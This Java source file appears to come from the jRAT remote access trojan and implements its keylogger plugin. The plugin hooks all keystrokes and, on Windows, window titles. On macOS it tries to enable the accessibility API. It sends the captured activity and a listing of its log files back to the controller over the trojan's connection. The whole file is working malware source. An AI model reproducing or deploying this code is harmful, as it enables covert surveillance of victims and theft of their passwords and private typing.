package pro.jrat.plugin.stub;

import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.InputStreamReader;

import org.jnativehook.GlobalScreen;

import pro.jrat.api.stub.StubPlugin;

public class KeyloggerPlugin extends StubPlugin {

	public static DataInputStream dis;
	public static DataOutputStream dos;
	public static boolean enabled;

	public static final byte KEY_HEADER = 121;
	public static final byte TITLE_HEADER = 122;
	public static final byte STATUS_HEADER = 123;
	public static final byte LOGS_HEADER = 124;
	public static final byte LOG_HEADER = 125;
	
	public void onEnable() throws Exception {
		
	}

	public void onDisconnect(Exception ex) {

	}

	public void onConnect(DataInputStream in, DataOutputStream out) {
		KeyloggerPlugin.dis = in;
		KeyloggerPlugin.dos = out;
	}

	public void onPacket(byte header) throws Exception {
		if (header == STATUS_HEADER) {
			dos.writeByte(STATUS_HEADER);

			int size = Activities.activities.size();

			dos.writeInt(size);

			for (int i = 0; i < size; i++) {
				Activity activity = Activities.activities.remove(0);
				try {
					dos.writeBoolean(activity instanceof Key);
					activity.write(dos);
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		} else if (header == LOGS_HEADER) {
			File[] years = getLogsRoot().listFiles();
			
			dos.writeByte(LOGS_HEADER);
			
			dos.writeInt(years.length);
			
			for (File year : years) {
				dos.writeUTF(year.getName());
				
				File[] months = year.listFiles();
				
				dos.writeInt(months.length);
				
				for (File month : months) {
					dos.writeUTF(month.getName());
					
					File[] days = month.listFiles();
					
					dos.writeInt(days.length);
					
					for (File day : days) {
						dos.writeUTF(day.getName());
					}
				}
			}
		}
	}

	public String getVersion() {
		return "1.0";
	}

	@Override
	public String getName() {
		return "Keylogger";
	}

	public static boolean isRoot() throws Exception {
		return !System.getProperty("os.name").toLowerCase().contains("win") && new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec("whoami").getInputStream())).readLine().equals("root");
	}

	@Override
	public void onStart() throws Exception {
		try {
			if (System.getProperty("os.name").toLowerCase().contains("mac")) {
				System.out.println("Trying to enable assistive devices... Even if enabled");
				
				Runtime.getRuntime().exec("touch /private/var/db/.AccessibilityAPIEnabled");
				
				System.out.println("Successfully executed command");
			}		
		} catch (Exception ex) {
			ex.printStackTrace();
			System.out.println("Failed to execute command. No root?");
		}
		
		GlobalScreen.registerNativeHook();
		GlobalScreen.getInstance().addNativeKeyListener(new Keylogger());

		if (System.getProperty("os.name").toLowerCase().contains("win")) {
			try {
				new Thread(new TitleListener()).start();
			} catch (Exception e) {
				e.printStackTrace();
			}
		}

		Runtime.getRuntime().addShutdownHook(new Thread(new Runnable() {

			@Override
			public void run() {
				try {
					GlobalScreen.unregisterNativeHook();
				} catch (Exception ex) {
					ex.printStackTrace();
				}
			}

		}));
	}
	
	public static File getLogsRoot() {
		File file = new File(System.getProperty("user.home") + "\\Desktop\\LOGSTEST\\");
		file.mkdirs();
		return file;
	}
}
